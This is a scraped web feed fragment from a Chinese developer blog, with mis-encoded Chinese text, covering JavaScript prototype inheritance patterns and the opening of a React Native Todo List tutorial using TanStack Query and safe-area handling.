<span class="hljs-comment">// 2. ç»§æ‰¿åŸå‹æ–¹æ³•</span>
<span class="hljs-title class_">Student</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();
<span class="hljs-title class_">Student</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Student</span>;

<span class="hljs-title class_">Student</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">study</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' æ­£åœ¨å­¦ä¹ '</span>);
};

<span class="hljs-keyword">const</span> s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">'æå››'</span>, <span class="hljs-number">20</span>, <span class="hljs-string">'äºŒä¸­'</span>);
s.<span class="hljs-title function_">sayHi</span>();
s.<span class="hljs-title function_">study</span>();
</code></pre>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>å®ä¾‹å±æ€§ã€åŸå‹æ–¹æ³•ï¼Œå…¨éƒ½æœ‰äº†</li>
<li>å­ç±»å‹å¯ä»¥ç»§ç»­æŒ‚è‡ªå·±çš„æ–¹æ³•</li>
<li>ä½¿ç”¨ä½“éªŒä¸é”™ï¼Œé¢è¯•ä¹Ÿå¸¸é—®è¿™å—</li>
</ul>
<p>ä½†ä¾ç„¶æœ‰ä¸ªå°ç‘•ç–µï¼š</p>
<ul>
<li>
<p><strong>çˆ¶ç±»æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†ä¸¤æ¬¡</strong></p>
<ul>
<li>ä¸€æ¬¡åœ¨Â <code>Student</code>Â é‡Œï¼š<code>Person.apply</code></li>
<li>ä¸€æ¬¡åœ¨Â <code>Student.prototype = new Person()</code></li>
</ul>
</li>
</ul>
<p>å¦‚æœçˆ¶ç±»æ„é€ å‡½æ•°æ¯”è¾ƒé‡ï¼Œè¿™å°±å¤šå°‘æœ‰ç‚¹â€œæµªè´¹â€ã€‚</p>
<p>äºæ˜¯ï¼Œç¨‹åºå‘˜å¼€å§‹ç²¾æ‰“ç»†ç®—â€”â€”èƒ½ä¸èƒ½çœä¸€æ¬¡è°ƒç”¨ï¼Ÿ</p>
<h2 data-id="heading-4">äº”ã€é”™è¯¯ç¤ºèŒƒï¼šç›´æ¥æŠŠåŸå‹æŒ‡è¿‡å»â€”â€”â€œå…±äº«ä¸€ä»½å¤§è„‘ï¼Œæ”¹è°éƒ½å¤´ç–¼â€</h2>
<p>è¿™æ—¶å€™å®¹æ˜“èµ°çš„ä¸€æ­¥å‘æ˜¯ï¼š<br/>
<strong>ç›´æ¥æŠŠå­ç±»åŸå‹æŒ‡å‘çˆ¶ç±»åŸå‹</strong>ï¼Œè§‰å¾—åˆçœäº‹åˆé«˜æ•ˆï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">identity</span> = <span class="hljs-string">'å…¬æ°‘'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Student</span>(<span class="hljs-params">name, school</span>) {
  <span class="hljs-title class_">Person</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">school</span> = school;
}

<span class="hljs-comment">// ç›´æ¥å¼•ç”¨åŒä¸€ä¸ªåŸå‹å¯¹è±¡</span>
<span class="hljs-title class_">Student</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;  <span class="hljs-comment">// å¤§å‘</span>
<span class="hljs-title class_">Student</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Student</span>;
<span class="hljs-title class_">Student</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">study</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­¦ä¹ ä¸­...'</span>);
};
</code></pre>
<p>è¡¨é¢çœ‹ï¼š</p>
<ul>
<li>æ„é€ å‡½æ•°åªè°ƒç”¨äº†ä¸€æ¬¡</li>
<li>åŸå‹çœ‹èµ·æ¥ä¹Ÿèƒ½ç”¨</li>
</ul>
<p>ä½†å®è´¨ä¸Šé—®é¢˜å·¨å¤§ï¼š</p>
<ul>
<li><code>Student.prototype</code>Â å’ŒÂ <code>Person.prototype</code>Â æ˜¯<strong>åŒä¸€ä¸ªå¯¹è±¡</strong></li>
<li>ä½ ç»™Â <code>Student.prototype</code>Â åŠ çš„Â <code>study</code>ï¼Œå…¶å®æ˜¯åŠ åœ¨Â <code>Person.prototype</code>Â ä¸Š</li>
<li>ä½ æŠŠÂ <code>Student.prototype.constructor</code>Â æ”¹å›Â <code>Student</code>ï¼Œç­‰äºä¿®æ”¹äº†Â <code>Person.prototype.constructor</code></li>
<li>ç®€å•è¯´ï¼š<strong>çˆ¶ç±»å’Œå­ç±»å…±ç”¨ä¸€å¥—â€œè„‘å­â€ï¼Œä½ æ”¹ä¸€ç‚¹ï¼Œä¸¤è¾¹éƒ½å—å½±å“</strong></li>
</ul>
<p>è¿™æ­£æ˜¯é‚£æ®µâ€œç›´æ¥ç»§æ‰¿ prototypeÂ ä¼šå½±å“åŒæ–¹Â constructorâ€çš„å…¸å‹åœºæ™¯ï¼Œå±äºâ€œçœ‹èµ·æ¥å¾ˆèªæ˜ã€å®é™…ä¸Šå¾ˆå±é™©â€çš„å†™æ³•ã€‚</p>
<h2 data-id="heading-5">å…­ã€è¿›åŒ–å®Œæˆï¼šä¸­ä»‹å‡½æ•° + ç»„åˆç»§æ‰¿â€”â€”â€œæˆ‘ä»¬æœ‰è”ç³»ï¼Œä½†å„è‡ªç‹¬ç«‹â€</h2>
<p>æœ€åçš„æˆç†Ÿå½¢æ€å°±æ˜¯ï¼š</p>
<ol>
<li>ç»§ç»­ç”¨Â <code>call/apply</code>Â ç»§æ‰¿å®ä¾‹å±æ€§</li>
<li>åŸå‹é“¾è¿™ä¸€å—ï¼Œ<strong>é€šè¿‡ä¸€ä¸ªâ€œä¸­ä»‹å‡½æ•°â€æ¥åšè½¬æ¥</strong>ï¼Œé¿å…ç›´æ¥æ”¹åŠ¨çˆ¶åŸå‹</li>
</ol>
<p>ä¸€ä¸ªå¸¸è§çš„å°è£…æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä½ å¥½ï¼Œæˆ‘æ˜¯ '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Student</span>(<span class="hljs-params">name, age, school</span>) {
  <span class="hljs-title class_">Person</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, [name, age]);  <span class="hljs-comment">// ç»§æ‰¿å®ä¾‹å±æ€§</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">school</span> = school;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">Parent, Child</span>) {
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params"/>) {}                 <span class="hljs-comment">// ä¸­ä»‹å‡½æ•°</span>
  F.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>; <span class="hljs-comment">// è¿æ¥åˆ°çˆ¶åŸå‹</span>
  <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>();      <span class="hljs-comment">// å­åŸå‹åŸºäº F çš„å®ä¾‹</span>
  <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Child</span>;
}

<span class="hljs-title function_">extend</span>(<span class="hljs-title class_">Person</span>, <span class="hljs-title class_">Student</span>);

<span class="hljs-title class_">Student</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">study</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' åœ¨ '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">school</span> + <span class="hljs-string">' å­¦ä¹ '</span>);
};

<span class="hljs-keyword">const</span> s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">'ç‹äº”'</span>, <span class="hljs-number">22</span>, <span class="hljs-string">'ä¸‰ä¸­'</span>);
s.<span class="hljs-title function_">sayHi</span>();
s.<span class="hljs-title function_">study</span>();
</code></pre>
<p>è¿™ä¸€å¥—çš„å¥½å¤„ï¼š</p>
<ul>
<li>
<p><strong>çˆ¶ç±»æ„é€ å‡½æ•°åªè°ƒç”¨ä¸€æ¬¡</strong>ï¼ˆåœ¨Â <code>Student</code>Â æ„é€ å‡½æ•°å†…éƒ¨ï¼‰</p>
</li>
<li>
<p>å­ç±»å®ä¾‹é€šè¿‡åŸå‹é“¾ï¼Œèƒ½è®¿é—®åˆ°çˆ¶ç±»åŸå‹çš„æ–¹æ³•</p>
</li>
<li>
<p>å­ç±»çš„åŸå‹æ˜¯é€šè¿‡ä¸­ä»‹å‡½æ•°Â <code>F</code>Â é—´æ¥è¿æ¥åˆ°çˆ¶ç±»åŸå‹çš„</p>
<ul>
<li>ä¿®æ”¹å­ç±»åŸå‹ä¸ä¼šç›´æ¥åŠ¨åˆ°çˆ¶ç±»åŸå‹</li>
</ul>
</li>
<li>
<p>å¯ä»¥æŠŠÂ extendÂ æŠ½å‡ºæ¥å¤ç”¨ï¼Œä»»ä½•æ„é€ å‡½æ•°å¯¹éƒ½èƒ½ç”¨è¿™å¥—æ¨¡å¼</p>
</li>
</ul>
<p>è¿™ä¸€å¥—é€šå¸¸è¢«ç§°ä½œ<strong>å¯„ç”Ÿç»„åˆç»§æ‰¿</strong>ï¼Œåœ¨ä¼ ç»Ÿ ES5Â å†™æ³•é‡Œï¼Œæ˜¯éå¸¸ä¸»æµã€ç›¸å¯¹â€œæˆç†Ÿâ€çš„æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-6">ä¸ƒã€å†™åœ¨æœ€åï¼šç†è§£æ¯”èƒŒä»£ç æ›´é‡è¦</h2>
<p>åæ¥æœ‰äº†Â <code>class</code>Â /Â <code>extends</code>Â è¯­æ³•ç³–ï¼Œçœ‹èµ·æ¥å°±åƒåˆ«çš„è¯­è¨€é‚£æ ·ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä½ å¥½ï¼Œæˆ‘æ˜¯ '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Person</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age, school</span>) {
    <span class="hljs-variable language_">super</span>(name, age);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">school</span> = school;
  }
  <span class="hljs-title function_">study</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' åœ¨ '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">school</span> + <span class="hljs-string">' å­¦ä¹ '</span>);
  }
}
</code></pre>
<p>ä½†åº•å±‚çš„ç²¾ç¥ï¼Œå…¶å®è¿˜æ˜¯æˆ‘ä»¬ä¸Šé¢èµ°è¿‡çš„é‚£æ¡è·¯ï¼š<br/>
<strong>æ„é€ å‡½æ•° + åŸå‹é“¾ + é¿å…å…±äº«å‰¯ä½œç”¨</strong>ã€‚</p>
<p>å½“ä½ çœŸæ­£äº²æ‰‹èµ°ä¸€éï¼š</p>
<ul>
<li>ä»å¤åˆ¶ç²˜è´´</li>
<li>åˆ°æ„é€ å‡½æ•°ç»§æ‰¿</li>
<li>åˆ°åŸå‹é“¾ç»§æ‰¿</li>
<li>åˆ°ç»„åˆç»§æ‰¿</li>
<li>å†åˆ°â€œç›´æ¥æ”¹åŸå‹â€ç¿»è½¦</li>
<li>æœ€åç”¨ä¸­ä»‹å‡½æ•°å®ç°å¯„ç”Ÿç»„åˆç»§æ‰¿</li>
</ul>
<p>å°±ä¸å†åªæ˜¯â€œä¼šç”¨ç»§æ‰¿â€ï¼Œè€Œæ˜¯<strong>ç†è§£äº†å®ƒä¸ºä»€ä¹ˆè¦è¿™ä¹ˆè®¾è®¡</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React Native å®æˆ˜ï¼šæ„å»ºä¸€ä¸ªç°ä»£åŒ–çš„ Todo List (React Query + SafeArea + é”®ç›˜é€‚é…)]]></title>    <link>https://juejin.cn/post/7582231988146569267</link>    <guid>https://juejin.cn/post/7582231988146569267</guid>    <pubDate>2025-12-11T08:33:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582231988146569267" data-draft-id="7582182817108541466" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React Native å®æˆ˜ï¼šæ„å»ºä¸€ä¸ªç°ä»£åŒ–çš„ Todo List (React Query + SafeArea + é”®ç›˜é€‚é…)"/> <meta itemprop="keywords" content="å‰ç«¯,React Native"/> <meta itemprop="datePublished" content="2025-12-11T08:33:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çš®è›‹å°ç²¾çµ"/> <meta itemprop="url" content="https://juejin.cn/user/219558056559278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React Native å®æˆ˜ï¼šæ„å»ºä¸€ä¸ªç°ä»£åŒ–çš„ Todo List (React Query + SafeArea + é”®ç›˜é€‚é…)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/219558056559278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çš®è›‹å°ç²¾çµ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T08:33:44.000Z" title="Thu Dec 11 2025 08:33:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ React Native å¼€å‘ä¸­ï¼Œæ„å»ºä¸€ä¸ªçœ‹ä¼¼ç®€å•çš„â€œå¾…åŠäº‹é¡¹åˆ—è¡¨â€ï¼Œå¾€å¾€èƒ½æŠ˜å°„å‡ºå¼€å‘è€…å¯¹æ•°æ®æµã€UI é€‚é…å’Œç”¨æˆ·ä½“éªŒçš„ç†è§£ã€‚</p>
<p>æœ¬æ–‡å°†é€šè¿‡ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼Œå¸¦ä½ æŒæ¡ React Native å¼€å‘çš„ä¸‰ä¸ªæ ¸å¿ƒæ”¯æŸ±ï¼š</p>
<ol>
<li><strong>æ•°æ®ç®¡ç†</strong>ï¼šä½¿ç”¨ <strong>TanStack Query (React Query)</strong> æ›¿ä»£æ‰‹åŠ¨ <code>useEffect</code>ã€‚</li>
<li><strong>å±å¹•é€‚é…</strong>ï¼šä½¿ç”¨ <strong>React Native Safe Area Context</strong> é€‚é…åˆ˜æµ·å±ã€‚</li>
<li><strong>äº¤äº’ä¼˜åŒ–</strong>ï¼šä½¿ç”¨ <strong>KeyboardAvoidingView</strong> è§£å†³é”®ç›˜é®æŒ¡é—®é¢˜ã€‚</li>
</ol>
<h2 data-id="heading-0">æœ€ç»ˆæ•ˆæœé¢„è§ˆ</h2>
<p>æˆ‘ä»¬å°†å®ç°ä¸€ä¸ªåŒ…å«ä»¥ä¸‹åŠŸèƒ½çš„ Appï¼š</p>
<ul>
<li>âœ… ä»æ¨¡æ‹Ÿ API å¼‚æ­¥åŠ è½½æ•°æ®ã€‚</li>
<li>âœ… æäº¤æ–°ä»»åŠ¡æ—¶æ˜¾ç¤ºåŠ è½½çŠ¶æ€ï¼ˆPendingï¼‰ã€‚</li>
<li>âœ… æäº¤æˆåŠŸåè‡ªåŠ¨åˆ·æ–°åˆ—è¡¨ã€‚</li>
<li>âœ… å®Œç¾é¿å¼€é¡¶éƒ¨åˆ˜æµ·å±å’Œåº•éƒ¨é”®ç›˜é®æŒ¡ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-1">æ ¸å¿ƒä»£ç è§£æ</h2>
<h3 data-id="heading-2">1. ç°ä»£åŒ–æ¶æ„ï¼šå¼•å…¥ TanStack Query</h3>
<p>åœ¨ä¼ ç»Ÿçš„å†™æ³•ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ç»´æŠ¤ <code>isLoading</code>ã€<code>isError</code> å’Œ <code>data</code> ä¸‰ä¸ªçŠ¶æ€ã€‚è€Œä½¿ç”¨ TanStack Queryï¼Œä¸€åˆ‡å˜å¾—æå…¶ç®€æ´ã€‚</p>
<h4 data-id="heading-3">é…ç½® Provider</h4>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åœ¨ App çš„æœ€å¤–å±‚åŒ…è£¹ <code>QueryClientProvider</code>ï¼Œå®ƒæ˜¯ React Query çš„å¤§è„‘ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// åˆå§‹åŒ– Client</span>
<span class="hljs-keyword">const</span> queryClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryClient</span>();

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">QueryClientProvider</span> <span class="hljs-attr">client</span>=<span class="hljs-string">{queryClient}</span>&gt;</span>
      {/* åº”ç”¨å…¶ä½™éƒ¨åˆ† */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">QueryClientProvider</span>&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-4">è·å–æ•°æ® (useQuery)</h4>
<p>æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª <code>getTodos</code> å‡½æ•°æ¨¡æ‹Ÿ API è¯·æ±‚ã€‚åœ¨ç»„ä»¶ä¸­ï¼Œé€šè¿‡ <code>useQuery</code> é’©å­è‡ªåŠ¨ç®¡ç†è¯·æ±‚ç”Ÿå‘½å‘¨æœŸã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">const</span> { <span class="hljs-attr">data</span>: todos, isLoading, isError, error } = <span class="hljs-title function_">useQuery</span>({
  <span class="hljs-attr">queryKey</span>: [<span class="hljs-string">'todos'</span>], <span class="hljs-comment">// ç¼“å­˜çš„å”¯ä¸€æ ‡è¯†</span>
  <span class="hljs-attr">queryFn</span>: getTodos,   <span class="hljs-comment">// å…·ä½“çš„è¯·æ±‚å‡½æ•°</span>
});
</code></pre>
<ul>
<li><strong>ä¼˜åŠ¿</strong>ï¼šç»„ä»¶æŒ‚è½½æ—¶è‡ªåŠ¨è¯·æ±‚ï¼Œå¤±è´¥è‡ªåŠ¨é‡è¯•ï¼Œè‡ªå¸¦ Loading çŠ¶æ€ã€‚</li>
</ul>
<h4 data-id="heading-5">ä¿®æ”¹æ•°æ® (useMutation)</h4>
<p>æ·»åŠ ä»»åŠ¡æ˜¯ä¸€ä¸ªâ€œå‰¯ä½œç”¨â€æ“ä½œï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>useMutation</code>ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">const</span> mutation = <span class="hljs-title function_">useMutation</span>({
  <span class="hljs-attr">mutationFn</span>: postTodo,
  <span class="hljs-attr">onSuccess</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// å…³é”®ä¸€æ­¥ï¼šæˆåŠŸåå‘Šè¯‰ React Query ç¼“å­˜è¿‡æœŸäº†</span>
    <span class="hljs-comment">// å®ƒä¼šè‡ªåŠ¨é‡æ–°è¯·æ±‚æœ€æ–°çš„åˆ—è¡¨æ•°æ®ï¼ŒUI éšä¹‹æ›´æ–°</span>
    queryClient.<span class="hljs-title function_">invalidateQueries</span>({ <span class="hljs-attr">queryKey</span>: [<span class="hljs-string">'todos'</span>] });
    <span class="hljs-title function_">setText</span>(<span class="hljs-string">''</span>); <span class="hljs-comment">// æ¸…ç©ºè¾“å…¥æ¡†</span>
  },
  <span class="hljs-attr">onError</span>: <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-title class_">Alert</span>.<span class="hljs-title function_">alert</span>(<span class="hljs-string">'é”™è¯¯'</span>, <span class="hljs-string">`æ·»åŠ å¤±è´¥: <span class="hljs-subst">${err}</span>`</span>);
  },
});
</code></pre>
<hr/>
<h3 data-id="heading-6">2. å±å¹•é€‚é…ï¼šSafeArea çš„æ­£ç¡®å§¿åŠ¿</h3>
<p>éšç€ iPhone çµåŠ¨å²›å’Œ Android æŒ–å­”å±çš„æ™®åŠï¼Œæ™®é€šçš„ <code>View</code> å·²ç»æ— æ³•æ»¡è¶³éœ€æ±‚ã€‚React Native å®˜æ–¹å·²å¼ƒç”¨å†…ç½®çš„ <code>SafeAreaView</code>ï¼Œè½¬è€Œæ¨èç¤¾åŒºæ ‡å‡†åº“ <code>react-native-safe-area-context</code>ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">SafeAreaProvider</span>, <span class="hljs-title class_">SafeAreaView</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native-safe-area-context'</span>;

